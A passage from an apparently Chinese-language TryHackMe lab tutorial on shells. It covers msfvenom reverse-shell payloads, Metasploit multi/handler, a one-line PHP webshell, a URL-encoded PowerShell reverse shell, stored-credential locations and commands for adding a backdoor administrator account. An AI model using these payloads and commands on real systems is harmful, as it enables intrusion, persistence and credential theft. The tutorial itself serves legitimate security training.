class="hljs-selector-class">.GetBytes</span>($sendback2);<span class="hljs-variable">$stream</span><span class="hljs-selector-class">.Write</span>($sendbyte,<span class="hljs-number">0</span>,$sendbyte.Length);<span class="hljs-variable">$stream</span><span class="hljs-selector-class">.Flush</span>()};<span class="hljs-variable">$client</span><span class="hljs-selector-class">.Close</span>()"</code></pre>
<p>为了使用它，我们需要用适当的 IP 和端口选择来替换"<code>&lt;IP&gt;</code>" 和 “<code>&lt;port&gt;</code>”，然后将其复制到 cmd.exe shell中并执行该命令（或者使用 在 Windows 服务器上执行命令的另一种方法，例如 webshell），从而生成反向 shell：</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240324120352118.png" alt="image-20240324120352118"></p>
<p>对于其他常见的反向 shell 有效载荷，可以参考github上的PayloadsAllTheThings存储库，其中包含了多种不同语言的 shell 代码（通常以单行格式进行复制和粘贴）。</p>
<blockquote>
<p>PayloadAllTheThings项目链接：<br>
<a target="_blank" rel="noopener" href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology and Resources/Reverse Shell Cheatsheet.md</a></p>
</blockquote>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240324120523825.png" alt="image-20240324120523825"></p>
<h1 id="0x09-msfvenom生成shell-payload">0x09 Msfvenom生成shell payload</h1>
<p>Msfvenom作为 Metasploit 框架的一部分，主要用于生成用于反向和绑定 shell 的代码。 它被广泛用于开发低等级的exp，如：在开发缓冲区溢出漏洞exp时生成十六进制 shellcode；但是，它也可用于生成各种格式的有效负载（例如 .exe、.aspx、.war、.py）。 我们将在本节中使用Msfvenom的后一个功能。</p>
<p>msfvenom 的标准语法如下：</p>
<pre><code class="hljs scss">msfvenom -<span class="hljs-selector-tag">p</span> &lt;PAYLOAD&gt; &lt;OPTIONS&gt;</code></pre>
<p>例如，要以 exe 格式生成 Windows x64反向 Shell，我们可以使用:</p>
<pre><code class="hljs scss">msfvenom -<span class="hljs-selector-tag">p</span> windows/x64/shell/reverse_tcp -f exe -o shell<span class="hljs-selector-class">.exe</span> LHOST=&lt;listen-IP&gt; LPORT=&lt;listen-port&gt;</code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240324121003377.png" alt="image-20240324121003377"></p>
<p>这里我们设定一个有效载荷涉及到四个参数选项:</p>
<ul>
<li><code>-f &lt;format&gt;</code>:指定输出格式。 在上面的命令中，格式是一个可执行文件 (exe)</li>
<li><code>-o &lt;file&gt;</code>:生成的有效载荷（payload）的输出位置和文件名。</li>
<li><code>LHOST=&lt;IP&gt;</code>:指定要回连的 IP（即攻击机IP）。 当你使用 TryHackMe 的VPN连接到你自己的攻击机时，这将是你的 tun0 IP 地址。</li>
<li><code>LPORT=&lt;port&gt;</code>:要回连的本地攻击机上的端口。 可以是 0 到 65535 之间尚未使用的任何值；但是设定为低于 1024 的端口时将受到限制，需要以 root 权限运行监听器。</li>
</ul>
<p><strong>Staged vs Stageless</strong>（分段和不分段）</p>
<p>在我们进一步讨论之前，必须介绍另外两个概念：分段的反向 shell 有效负载、不分段的反向 shell 有效负载。</p>
<ul>
<li>分段的反向shell有效载荷分两部分发送。第一部分称为stager，这是一段直接在服务器本身上执行的代码，它会回连攻击机上等待的监听器，但它本身并不包含任何反向 shell 代码。第一部分的stager将连接到监听器并使用连接来加载真正的有效载荷，这样能直接执行真正的payload并防止真正的payload接触到磁盘，以免被传统的反病毒解决方案拦截。 因此，此类有效载荷分为两部分——一个小的初始段，然后是在初始段启动时所下载的更大的反向 shell 代码段。 分段的有效载荷需要一个特殊的监听器——通常是Metasploit multi/handler，这将在下一个小节中介绍。</li>
<li>不分段的反向shell有效载荷更常见——这些也是我们迄今为止一直在使用的。 它们是完全独立的，因为在成功执行一段代码时会立即将 shell 发送回攻击机上等待的监听器。</li>
</ul>
<p>不分段的有效载荷往往更易于使用和捕获； 但是，它们也更庞大，并且更容易被防病毒或入侵检测程序发现和删除。</p>
<p>分段的有效载荷更难使用，但它的初始段要短得多，有时会被效率较低的防病毒软件遗漏。 现代防病毒解决方案还将利用反恶意软件扫描接口 (AMSI：Anti-Malware Scan Interface) 来检测有效载荷，这使得分段有效载荷不如以前那么有效。</p>
<p><strong>Meterpreter</strong>（英文意思是翻译器）</p>
<p>关于 Metasploit，另一个要讨论是 Meterpreter shell。 Meterpreter shell 是 Metasploit自带的的全功能 shell，它们是完全稳定的，这使得它们在针对Windows 目标机时效果非常好。Meterpreter shell 也有很多自己的内置功能，例如文件上传和下载。 如果我们想使用Metasploit 的后渗透工具，那么我们就需要先获得一个 Meterpreter shell。</p>
<p>Meterpreter shell 的缺点是它们必须在 Metasploit中才能捕获，它们也被某些认证考试禁止使用，因此学习关于Meterpreter的替代方法是个好主意。</p>
<p><strong>有效载荷（payload）命名约定</strong></p>
<p>使用 msfvenom 时，了解命名系统的工作原理很重要，基本的payload命名约定如下：</p>
<pre><code class="hljs scss">&lt;OS&gt;/&lt;arch&gt;/&lt;payload&gt;</code></pre>
<p>例如:</p>
<blockquote>
<p>linux/x86/shell_reverse_tcp</p>
</blockquote>
<p>这将为 x86 Linux 的目标机生成不分段的反向shell payload。</p>
<p>此基本命名约定的例外是Windows 32位操作系统的目标，对于该类目标，命名payload时，不会指定操作系统的架构位数，例如：</p>
<blockquote>
<p>windows/shell_reverse_tcp</p>
</blockquote>
<p>对于64位的 Windows 目标，命名payload时，arch 将被指定为normal (x64) 。</p>
<p>我们把命名中关于payload的部分再细分一下。</p>
<p>在上面的示例中，使用的payload是 <code>shell_reverse_tcp</code>， 这表明它是一个不分段的payload。不分段的payload会用下划线 (_) 表示，与此payload等效的分段payload是：<code>shell/reverse_tcp</code>（分段payload会用一个斜杠/表示）。</p>
<p>这些规则也适用于 Meterpreter payload。一个针对Windows 64位目标的分段Meterpreter payload ，名称将如下所示：</p>
<blockquote>
<p>windows/x64/meterpreter/reverse_tcp</p>
</blockquote>
<p>针对Linux 32位目标的不分段 Meterpreter payload，名称将如下所示：</p>
<blockquote>
<p>linux/x86/meterpreter_reverse_tcp</p>
</blockquote>
<p>除了 msfconsole 手册页之外，使用 msfvenom 时要注意的另一个命令是：<code>msfvenom --list payloads</code>，这可用于列出所有可用的有效载荷，然后可以将其通过管道符传输到 grep 以搜索一组特定的有效载荷，例如：</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240324160725346.png" alt="image-20240324160725346"></p>
<p>这为我们提供了一整套针对 Linux 32位目标的 Meterpreter 有效载荷。</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240324161500055.png" alt="image-20240324161500055"></p>
<pre><code class="hljs scss">msfvenom -<span class="hljs-selector-tag">p</span> linux/x64/meterpreter/reverse_tcp -f elf -o shell lhost=<span class="hljs-number">10.10</span><span class="hljs-selector-class">.10</span><span class="hljs-selector-class">.5</span> lport=<span class="hljs-number">443</span></code></pre>
<h1 id="0x10-metasploit-multihandler模块">0x10 Metasploit multi/handler模块</h1>
<p>Multi/Handler 是捕获反向 shell 的绝佳工具（multi/handler模块充当的是连接shell的监听器），如果你想使用 Meterpreter shell，这是必不可少的，并且这也是使用分段payload时的首选。</p>
<p>幸运的是，它相对容易使用:</p>
<ol>
<li>使用" msfconsole "命令启动Metasploit</li>
<li>输入" use multi/handler "命令，按下回车键</li>
</ol>
<p>我们现在准备开始一个multi/handler会话，让我们使用 options 命令查看可用的选项:</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240324161723719.png" alt="image-20240324161723719"></p>
<p>我们需要设置三个选项：payload、LHOST 和 LPORT。 这些都与我们在使用 Msfvenom 生成 shellcode 时设置的选项相同——特定于我们的目标的payload，以及我们可以接收 shell 的监听IP地址和端口。</p>
<p>请注意，在此处必须指定 LHOST，因为 metasploit 不会像 netcat 或 socat 那样监听所有网络接口； 所以你必须告诉它一个特定的地址以便进行监听（使用 TryHackMe 时，这将是你的 tun0 地址）。 我们使用以下命令设置这些选项：</p>
<ul>
<li><code>set PAYLOAD &lt;payload&gt;</code></li>
<li><code>set LHOST &lt;listen-address&gt;</code></li>
<li><code>set LPORT &lt;listen-port&gt;</code></li>
</ul>
<p>我们现在应该已经准备好开始监听了！</p>
<p>让我们通过使用" exploit -j "命令，这将告诉 Metasploit 启动模块并将其作为作业（job）在后台运行</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240324162030799.png" alt="image-20240324162030799"></p>
<p>你可能注意到在上面的截图中，Metasploit 正在监听一个1024以下的端口。为此，Metasploit 必须使用 sudo 权限运行。</p>
<p>当在前面的msfvenom中生成的分段payload开始运行时，Metasploit 将接收连接，并会发送剩余的payload然后给我们提供一个反向 shell:</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240324162139519.png" alt="image-20240324162139519"></p>
<p>请注意，因为在上面的案例中multi/handler 开始是在后台处理的，所以我们需要使用 " sessions 1 “命令再次将其置于前台。 这很有效，因为它是唯一运行的会话。 如果还有其他活动的会话，我们将需要使用” sessions "命令来查看所有活动的会话，然后使用<code>sessions &lt;number&gt;</code>命令来选择适当的会话置于前台。 这个数字也将显示在打开 shell 的行中（你能看到“<em>Command Shell session <strong>1</strong> opened</em> ”）。</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240324162240125.png" alt="image-20240324162240125"></p>
<h1 id="0x11-webshell介绍">0x11 webshell介绍</h1>
<p>有时我们会遇到允许我们以某种方式上传可执行文件的网站。 理想情况下，我们会利用这个机会上传可以激活反向shell或绑定 shell 的代码，但有时这是不可能的。 所以在非理想情况下，我们将改为上传 webshell。（请参阅我之前写的关于上传漏洞的博客文章，以更广泛地了解此概念）</p>
<p>“Webshell”是一个通俗的术语，用于指代在网络服务器（通常使用 PHP 或 ASP 等语言）中运行的脚本，该脚本能在服务器上执行代码。本质上，命令被输入到网页中——通过 HTML 表单，或者直接作为 URL 中的参数——然后由脚本执行，执行的结果返回并会写入网站页面。在另一方面，webshell也能够作为进入完全成熟的反向shell或绑定shell的垫脚石。</p>
<p>由于 PHP 仍然是最常见的服务器端脚本语言，让我们来看一些简单的PHP代码，以一种非常基础的单行格式书写:</p>
<pre><code class="hljs scss">&lt;?php echo "&lt;pre&gt;" . <span class="hljs-built_in">shell_exec</span>($_GET["cmd"]) . "&lt;/pre&gt;"; ?&gt;</code></pre>
<p>这将在 URL 中获取一个 GET 参数，并使用" shell_exec() "在系统上执行它。</p>
<p>这意味着我们在URL 中的 " ?cmd= "之后输入的任何命令都将在系统上执行——无论是 Windows 还是 Linux。 " pre "元素是为了确保显示在网站页面上的结果的格式正确。</p>
<p>让我们看看实际情况:</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240324162539238.png" alt="image-20240324162539238"></p>
<p>请注意，当导航到shell.php页面时，我们在url中使用了带有" ifconfig “命令的 GET 参数” cmd "，然后正确地返回了目标的网络信息。</p>
<p>换句话说，通过在我们上传的shell.php页面的 URL 中输入 ifconfig 命令（该命令用于检查 Linux 目标上的网络接口），使得命令在系统上执行，并将结果返回给我们。 这适用于任何其他命令（例如 whoami、hostname、arch 等）。</p>
<p>如前所述，在 Kali 上默认有多种 webshell 可用，位于/usr/share/webshells路径下——包括臭名昭著的 PentestMonkey php-reverse-shell——一个用 PHP 编写的完整的反向 shell。</p>
<p>请注意，大多数通用的、特定语言的（例如 PHP）反向 shell 是为基于 Unix 的目标（例如 Linux 网络服务器）编写的，它们可能无法在 Windows 上运行。</p>
<blockquote>
<p>PentestMonkey反向shell 链接： <a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php">https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php</a></p>
</blockquote>
<p>当目标是 Windows 时，通常使用 web shell 获取 RCE，或者使用 msfvenom 生成对应服务器语言的反向/绑定 shell。 前一种方法，通常是使用 URL 编码的 Powershell Reverse Shell 来获取 RCE。 这将作为前面提到的webshell中的cmd 参数复制到 URL 中：</p>
<pre><code class="hljs scss">powershell%<span class="hljs-number">20</span>-c%<span class="hljs-number">20%</span><span class="hljs-number">22%</span><span class="hljs-number">24</span>client%<span class="hljs-number">20%</span><span class="hljs-number">3</span>D%<span class="hljs-number">20</span>New-<span class="hljs-selector-tag">Object</span>%<span class="hljs-number">20S</span>ystem<span class="hljs-selector-class">.Net</span><span class="hljs-selector-class">.Sockets</span><span class="hljs-selector-class">.TCPClient</span>%<span class="hljs-number">28%</span><span class="hljs-number">27</span>&lt;IP&gt;%<span class="hljs-number">27%</span><span class="hljs-number">2</span>C&lt;PORT&gt;%<span class="hljs-number">29%</span><span class="hljs-number">3</span>B%<span class="hljs-number">24s</span>tream%<span class="hljs-number">20%</span><span class="hljs-number">3</span>D%<span class="hljs-number">20%</span><span class="hljs-number">24</span>client<span class="hljs-selector-class">.GetStream</span>%<span class="hljs-number">28%</span><span class="hljs-number">29%</span><span class="hljs-number">3</span>B%<span class="hljs-number">5</span>Bbyte%<span class="hljs-number">5</span>B%<span class="hljs-number">5</span>D%<span class="hljs-number">5</span>D%<span class="hljs-number">24</span>bytes%<span class="hljs-number">20%</span><span class="hljs-number">3</span>D%<span class="hljs-number">200</span>.<span class="hljs-selector-class">.65535</span>%<span class="hljs-number">7</span>C%<span class="hljs-number">25%</span><span class="hljs-number">7</span>B0%<span class="hljs-number">7</span>D%<span class="hljs-number">3</span>Bwhile%<span class="hljs-number">28%</span><span class="hljs-number">28%</span><span class="hljs-number">24</span>i%<span class="hljs-number">20%</span><span class="hljs-number">3</span>D%<span class="hljs-number">20%</span><span class="hljs-number">24s</span>tream<span class="hljs-selector-class">.Read</span>%<span class="hljs-number">28%</span><span class="hljs-number">24</span>bytes%<span class="hljs-number">2</span>C%<span class="hljs-number">200%</span><span class="hljs-number">2</span>C%<span class="hljs-number">20%</span><span class="hljs-number">24</span>bytes<span class="hljs-selector-class">.Length</span>%<span class="hljs-number">29%</span><span class="hljs-number">29%</span><span class="hljs-number">20</span>-ne%<span class="hljs-number">200%</span><span class="hljs-number">29%</span><span class="hljs-number">7</span>B%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>data%<span class="hljs-number">20%</span><span class="hljs-number">3</span>D%<span class="hljs-number">20%</span><span class="hljs-number">28</span>New-<span class="hljs-selector-tag">Object</span>%<span class="hljs-number">20</span>-TypeName%<span class="hljs-number">20S</span>ystem<span class="hljs-selector-class">.Text</span><span class="hljs-selector-class">.ASCIIEncoding</span>%<span class="hljs-number">29</span><span class="hljs-selector-class">.GetString</span>%<span class="hljs-number">28%</span><span class="hljs-number">24</span>bytes%<span class="hljs-number">2</span>C0%<span class="hljs-number">2</span>C%<span class="hljs-number">20%</span><span class="hljs-number">24</span>i%<span class="hljs-number">29%</span><span class="hljs-number">3</span>B%<span class="hljs-number">24s</span>endback%<span class="hljs-number">20%</span><span class="hljs-number">3</span>D%<span class="hljs-number">20%</span><span class="hljs-number">28</span>iex%<span class="hljs-number">20%</span><span class="hljs-number">24</span>data%<span class="hljs-number">202%</span><span class="hljs-number">3</span>E%<span class="hljs-number">261%</span><span class="hljs-number">20%</span><span class="hljs-number">7</span>C%<span class="hljs-number">20</span>Out-String%<span class="hljs-number">20%</span><span class="hljs-number">29%</span><span class="hljs-number">3</span>B%<span class="hljs-number">24s</span>endback2%<span class="hljs-number">20%</span><span class="hljs-number">3</span>D%<span class="hljs-number">20%</span><span class="hljs-number">24s</span>endback%<span class="hljs-number">20%</span><span class="hljs-number">2</span>B%<span class="hljs-number">20%</span><span class="hljs-number">27</span>PS%<span class="hljs-number">20%</span><span class="hljs-number">27%</span><span class="hljs-number">20%</span><span class="hljs-number">2</span>B%<span class="hljs-number">20%</span><span class="hljs-number">28</span>pwd%<span class="hljs-number">29</span><span class="hljs-selector-class">.Path</span>%<span class="hljs-number">20%</span><span class="hljs-number">2</span>B%<span class="hljs-number">20%</span><span class="hljs-number">27%</span><span class="hljs-number">3</span>E%<span class="hljs-number">20%</span><span class="hljs-number">27%</span><span class="hljs-number">3</span>B%<span class="hljs-number">24s</span>endbyte%<span class="hljs-number">20%</span><span class="hljs-number">3</span>D%<span class="hljs-number">20%</span><span class="hljs-number">28%</span><span class="hljs-number">5</span>Btext<span class="hljs-selector-class">.encoding</span>%<span class="hljs-number">5</span>D%<span class="hljs-number">3</span>A%<span class="hljs-number">3</span>AASCII%<span class="hljs-number">29</span><span class="hljs-selector-class">.GetBytes</span>%<span class="hljs-number">28%</span><span class="hljs-number">24s</span>endback2%<span class="hljs-number">29%</span><span class="hljs-number">3</span>B%<span class="hljs-number">24s</span>tream<span class="hljs-selector-class">.Write</span>%<span class="hljs-number">28%</span><span class="hljs-number">24s</span>endbyte%<span class="hljs-number">2</span>C0%<span class="hljs-number">2</span>C%<span class="hljs-number">24s</span>endbyte<span class="hljs-selector-class">.Length</span>%<span class="hljs-number">29%</span><span class="hljs-number">3</span>B%<span class="hljs-number">24s</span>tream<span class="hljs-selector-class">.Flush</span>%<span class="hljs-number">28%</span><span class="hljs-number">29%</span><span class="hljs-number">7</span>D%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>client<span class="hljs-selector-class">.Close</span>%<span class="hljs-number">28%</span><span class="hljs-number">29%</span><span class="hljs-number">22</span></code></pre>
<p>这与我们在第8小节中遇到的powershell shell 相同，但是，它经过了 URL 编码，可以在 GET 参数中安全使用。 请记住，IP 和端口（以上内容中的IP、PORT）仍然需要在上面的代码中进行更改。</p>
<h1 id="0x12-获取shell之后的操作">0x12 获取shell之后的操作</h1>
<p>好了，我们有shell了，现在怎么办？</p>
<p>我们已经介绍了许多生成、发送和接收 shell 的方法，这些方法都有一个共同点，那就是得到的shell往往是不稳定的和非交互的。 即使是更容易稳定化的 Unix 风格的shell的稳定性也不是非常理想。 那么，我们能做些什么呢？</p>
<p>理想情况下，在 Linux 上，我们会接着寻找机会访问用户帐户，存储在<code>/home/&lt;user&gt;/.ssh</code>的 SSH 密钥通常是执行此操作的理想方式。</p>
<p>在 CTF 中，在目标机的某处发现密码凭证也不少见，一些漏洞exp还允许你添加自己的帐户，特别是像 Dirty C0w（脏牛漏洞） 或可写的 /etc/shadow 文件或 /etc/passwd文件会很快让你通过 SSH 来访问目标机器，假设目标机器的SSH服务是打开的。</p>
<blockquote>
<p>Dirty C0w（脏牛漏洞）介绍：<a target="_blank" rel="noopener" href="https://dirtycow.ninja/">https://dirtycow.ninja/</a></p>
</blockquote>
<p>而在 Windows 上，可利用的选项通常更加有限，有时可以在注册表中找到运行服务的密码。例如，VNC 服务器经常将密码以明文形式存储在注册表中，某些版本的 FileZilla FTP 服务器还会在 XML 文件中保留登录凭据，可能保留凭据的文件路径是：</p>
<pre><code class="hljs scss">C:\Program Files\FileZilla Server\FileZilla Server.xml 
#或者
C:\xampp\FileZilla Server\FileZilla Server.xml

#这些凭据可以是MD5散列值，也可以是明文，具体取决于版本</code></pre>
<p>理想情况下，在 Windows 上，你将获得以 SYSTEM 用户身份运行的 shell，或以高权限运行的管理员帐户。 在这种情况下，你可以简单地将你自己的帐户（在管理员组中）添加到计算机，然后通过 RDP、telnet、winexe、psexec、WinRM 或其他方法登录，具体情况取决于目标机器上运行的服务。</p>
<p>其基本语法如下:</p>
<pre><code class="hljs scss">net user &lt;username&gt; &lt;password&gt; /add            #添加新用户
net localgroup administrators &lt;username&gt; /add  #添加用户到管理员组</code></pre>
<p>反向 shell 和绑定 shell 是在机器上获得远程代码执行的基本技术，但是，它们永远不会像原生 shell 那样功能齐全。 理想情况下，我们总是希望升级为使用“正常”方法来访问机器，因为这总是更容易用于进一步利用目标。</p>
<h1 id="0x13-练习与实践">0x13 练习与实践</h1>
<p>这个章节包含了大量的信息，并且几乎没有机会让你始终将其付诸实践。</p>
<p>接下来的实践与案例将包含两个虚拟机（一个 Ubuntu 18.04 服务器和一个 Windows 服务器），每个都配置有一个简单的网络服务器，请使用它上传和激活 shell。</p>
<p>在这个案例中提供的是一个沙盒环境，所以没有过滤器需要进行绕过，你可以选择登录以使用 netcat、socat 或meterpreter shell 进行练习，提供登录凭据和说明，同时还会给出一些shell示例。</p>
<h2 id="linux-practice-box">Linux Practice Box</h2>
<p>附加到此任务的盒子是一个 Ubuntu 服务器，其文件上传页面在网络服务器上运行。这应该用于在 Linux 系统上练习 shell 上传。同样，本机上也安装了 socat 和 netcat，因此请随意通过端口 22 上的 SSH 登录来直接使用它们进行练习。登录的凭据是：</p>
<ul>
<li>用户名：shell</li>
<li>密码：TryH4ckM3!</li>
</ul>
<h3 id="练习1">练习1</h3>
<p>准备一个webshell</p>
<pre><code class="hljs scss">&lt;?php echo "&lt;pre&gt;" . <span class="hljs-built_in">shell_exec</span>($_GET["cmd"]) . "&lt;/pre&gt;"; ?&gt;</code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240324164350846.png" alt="image-20240324164350846"></p>
<p>接着在webshell页面连接攻击机监听端</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240324164815702.png" alt="image-20240324164815702"></p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240324164832964.png" alt="image-20240324164832964"></p>
<h3 id="练习2">练习2</h3>
<p>进入shell文件目录，修改对应IP与端口</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240324165101678.png" alt="image-20240324165101678"></p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240324165248044.png" alt="image-20240324165248044"></p>
<p>成功拿shell</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240324165307528.png" alt="image-20240324165307528"></p>
<h3 id="练习3">练习3</h3>
<p>ssh登录目标机</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240324165413527.png" alt="image-20240324165413527"></p>
<p>在目标机使用netcat建立监听端，并在攻击机使用nc连接目标端口即可拿到绑定shell</p>
